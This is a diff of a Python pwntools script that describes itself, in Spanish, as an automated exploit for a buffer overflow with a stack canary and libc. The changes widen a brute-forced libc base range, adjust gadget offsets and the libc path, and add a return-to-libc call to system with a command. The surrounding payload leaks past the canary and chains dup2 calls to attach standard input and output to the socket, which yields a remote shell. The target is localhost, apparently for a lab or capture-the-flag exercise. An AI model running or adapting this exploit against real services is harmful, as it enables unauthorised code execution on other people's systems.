@@ -9,12 +9,12 @@ from pwn import *
 
 DEFAULT_PORT = 9999
 DEFAULT_HOST = "localhost"
-DEFAULT_LIBC_BASE_START = 0xf7d00000
+DEFAULT_LIBC_BASE_START = 0xf7c00000
 DEFAULT_LIBC_BASE_END = 0xf7e00000
 DEFAULT_PAGE_SIZE = 0x1000
-DEFAULT_GADGET1_OFFSET = 0x000238a3
-DEFAULT_GADGET2_OFFSET = 0x0019ef7b
-DEFAULT_LIBC_PATH = "/usr/lib32/libc.so.6"
+DEFAULT_GADGET1_OFFSET = 0x000238a3 # Se debe ajustar por entorno
+DEFAULT_GADGET2_OFFSET = 0x0019ef7b # Se debe ajustar por entorno
+DEFAULT_LIBC_PATH = "/lib32/libc.so.6" # Ruta por defecto de libc en sistemas de 32 bits
 
 parser = argparse.ArgumentParser(description="Exploit automatizado para buffer overflow con canary y libc.")
 parser.add_argument("--host", default="localhost", help="Host objetivo (default: localhost)")
@@ -148,6 +148,7 @@ for base in libc_base_guesses:
     PAYLOAD = b"A" * offset # OFFSET TO CANARY
     PAYLOAD += canary
     PAYLOAD += b"B" * 12 # PADDING
+    PAYLOAD += system + gadget1 + ls_cmd
     PAYLOAD += dup2_cmd + gadget2 + p32(4) + p32(0)
     PAYLOAD += dup2_cmd + gadget2 + p32(4) + p32(1)
     PAYLOAD += dup2_cmd + gadget2 + p32(4) + p32(2)
